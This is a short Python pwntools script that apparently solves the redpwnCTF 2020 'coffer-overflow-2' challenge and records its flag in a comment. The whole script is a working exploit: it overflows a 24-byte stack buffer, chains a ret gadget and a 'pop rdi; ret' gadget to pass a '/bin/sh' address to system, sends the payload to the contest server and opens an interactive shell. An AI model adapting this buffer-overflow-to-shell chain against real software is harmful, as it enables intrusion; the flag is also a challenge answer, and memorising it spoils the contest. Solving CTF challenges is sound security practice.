from pwn import *

file = "./coffer-overflow-2"

context.binary = file
context.log_level = 'debug'

bin = ELF(file)
r = process(file)
#raw_input()
r = remote("2020.redpwnc.tf", 31908)
# flag{ret_to_b1n_m0re_l1k3_r3t_t0_w1n}

payload = "A" * 24
payload += pack(0x000000000040053e) # ret
payload += pack(0x0000000000400763) # : pop rdi; ret;
payload += pack(0x400803) # /bin/sh	/bin/sh	ds
payload += pack(bin.symbols["system"])


r.sendlineafter("What do you want to fill your coffer with?", payload)

r.interactive()


